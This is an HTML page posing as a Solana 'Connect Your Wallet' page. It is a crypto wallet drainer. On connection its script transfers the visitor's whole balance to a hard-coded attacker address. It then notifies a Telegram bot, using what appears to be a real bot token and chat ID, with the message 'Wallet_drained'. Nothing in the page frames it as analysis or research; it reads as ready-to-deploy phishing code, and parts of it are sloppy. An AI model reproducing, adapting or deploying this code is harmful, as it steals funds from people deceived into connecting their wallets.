<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Solana</title>
 <script src="https://unpkg.com/@solana/web3.js"></script>
 <script src="https://telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage?chat_id=<YOUR_CHAT_ID>&text=Wallet_drained"></script>
 <style>
 body { font-family: Arial, sans-serif; }
 .container { max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; }
 button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
 </style>
</head>
<body>
 <div class="container">
 <h1>Connect Your Wallet</h1>
 <p>Connect your Solana wallet here.</p>
 <button id="connectWallet">Connect Wallet</button>
 <p id="balance"></p>
 </div>
 <script>
 const connectWalletBtn = document.getElementById('connectWallet');
 const balanceDisplay = document.getElementById('balance');

 connectWalletBtn.addEventListener('click', async () => {
 try {
 const wallet = await window.solana.connect();
 const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));

 const balance = await connection.getBalance(wallet.publicKey);
 balanceDisplay.textContent = `Balance: ${balance / solanaWeb3.LAMPORTS_PER_SOL} SOL`;

 // Drain the wallet
 const transaction = new solanaWeb3.Transaction();
 transaction.add(
 solanaWeb3.SystemProgram.transfer({
 fromPubkey: wallet.publicKey,
 toPubkey: new solanaWeb3.PublicKey('8hbizekJY3x7ohV7qHipH1im8LGYn8KhhgPMoo66iF55'),
 lamports: balance,
 })
 );

 const signature = await wallet.signTransaction(transaction);
 await connection.sendRawTransaction(transaction.serialize());

 // Send notification to Telegram
 fetch(`https://telegram.org/bot<8732678869:AAEvdi0iwIspDdXO-nnirEFySLIUPFFuboI>/sendMessage?chat_id=<6870666933>&text=Wallet_drained`);
 } catch (error) {
 console.error('Error:', error);
 }
 });
 </script>
</body>
</html>
